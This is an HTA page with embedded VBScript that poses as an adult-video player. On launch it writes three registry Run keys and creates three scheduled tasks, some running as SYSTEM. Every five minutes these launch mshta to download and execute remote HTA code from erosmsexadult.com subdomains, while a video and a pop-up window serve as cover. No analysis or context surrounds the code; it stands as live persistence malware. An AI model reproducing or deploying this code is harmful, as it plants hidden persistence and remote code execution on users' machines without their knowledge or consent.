<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=EUC-JP">
<meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" />
<meta http-equiv="refresh" content="10; URL=http://i9cb9mage.erosmsexadult.com/pc/page/player_view.php?code=p&cuid=">
<title></title>

<Script Language="VBScript">
On Error Resume Next

winwidth = 600
winheight = 400

window.resizeTo winwidth, winheight

positionX = ( screen.availWidth - winwidth ) / 2
positionY = ( screen.availHeight - winheight ) / 2

window.moveTo positionX, positionY

'OSの判定
Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set colOperatingSystems = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
For Each objOperatingSystem In colOperatingSystems
    intOSType = objOperatingSystem.OSType
    strOSVer = Left(objOperatingSystem.Version, 3)
intProductType = objOperatingSystem.ProductType
'strOSArchitecture = objOperatingSystem.OSArchitecture
Next
Select Case intOSType
    Case 16 'Windows 95
        OS = 0
    Case 17 'Windows 98
        OS = 0
    Case 18 'WINNT
        Select Case strOSVer
            Case 4.0
                OS = 0
            Case 5.0
                OS = 0
            Case 5.1
                OS = 1
            Case 5.2
                OS = 2
	    Case 6.0
		If intProductType = 1 Then
		    OS = 2
		Else
		    OS = 2
		End If
	    Case 6.1
		If intProductType = 1 Then
		    OS = 2
		Else
		    OS = 2
		End If
            Case Else
                OS = 0
            End Select
    Case Else
        OS = 0
End Select

Dim WshShell
Set WshShell = CreateObject( "WScript.Shell" )

Dim WindowsDirectory
WindowsDirectory = WshShell.ExpandEnvironmentStrings( "%SystemRoot%" )

Dim regValue
Dim regDirectory

	regValue = WindowsDirectory & "\system32\mshta http://i9cb9mage.erosmsexadult.com/pc/page/player_view.php?code=p&cuid="
	regDirectory = "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\start__265"
	WshShell.RegWrite regDirectory, regValue, "REG_SZ"
If OS = 2 Then
	strCmd = "SCHTASKS /Create /TN start__265 /TR """ &regValue & """ /SC MINUTE /MO 5 /F"
	WshShell.Run strCmd, 7, false
ElseIf OS = 1 Then
	strCmd = "SCHTASKS /Create /RU system /TN start__265 /TR """ &regValue & """ /SC MINUTE /MO 5"
	WshShell.Run strCmd, 7, false
End If

	regValue = WindowsDirectory & "\system32\mshta http://imurw7age.erosmsexadult.com/pc/page/player_view.php?code=p&cuid="
	regDirectory = "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\start__266"
	WshShell.RegWrite regDirectory, regValue, "REG_SZ"
If OS = 2 Then
	strCmd = "SCHTASKS /Create /TN start__266 /TR """ &regValue & """ /SC MINUTE /MO 5 /F"
	WshShell.Run strCmd, 7, false
ElseIf OS = 1 Then
	strCmd = "SCHTASKS /Create /RU system /TN start__266 /TR """ &regValue & """ /SC MINUTE /MO 5"
	WshShell.Run strCmd, 7, false
End If

	regValue = WindowsDirectory & "\system32\mshta http://imaslccge.erosmsexadult.com/pc/page/player_view.php?code=p&cuid="
	regDirectory = "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\start__267"
	WshShell.RegWrite regDirectory, regValue, "REG_SZ"
If OS = 2 Then
	strCmd = "SCHTASKS /Create /TN start__267 /TR """ &regValue & """ /SC MINUTE /MO 5 /F"
	WshShell.Run strCmd, 7, false
ElseIf OS = 1 Then
	strCmd = "SCHTASKS /Create /RU system /TN start__267 /TR """ &regValue & """ /SC MINUTE /MO 5"
	WshShell.Run strCmd, 7, false
End If

WshShell.Run "wmplayer.exe http://mosquito.erosmsexadult.com/movie/sample_1.wmv", 4, False

Window.Open "http://i9cb9mage.erosmsexadult.com/pc/page/allot.php?code=p&cuid=&ckg=on&ln=/movie_list"

</Script>

<HTA:APPLICATION
	APPLICATIONNAME = ""
	ID = ""
	VERSION = "1.0"
	SINGLEINSTANCE = "yes"
	SHOWINTASKBAR = "no"
	NAVIGABLE = "no"
	WINDOWSTATE = "normal"
	BORDER = "none"
	INNERBORDER = "no"
	BORDERSTYLE = "normal"
	CONTEXTMENU = "yes"
	SELECTION = "no"
	SCROLL = "no"
	SCROLLFLAT = "no"
	CAPTION = "yes"
	ICON = ""
	SYSMENU = "no"
	MAXIMIZEBUTTON = "no"
	MINIMIZEBUTTON = "no"
/>

</head>
<body>
<asx version="3.0">
	<entry>
	<ref href="http://www.media-test.net/hta-test.net/movie/m01_01.wmv">
	</entry>
</asx>
</body>

</html>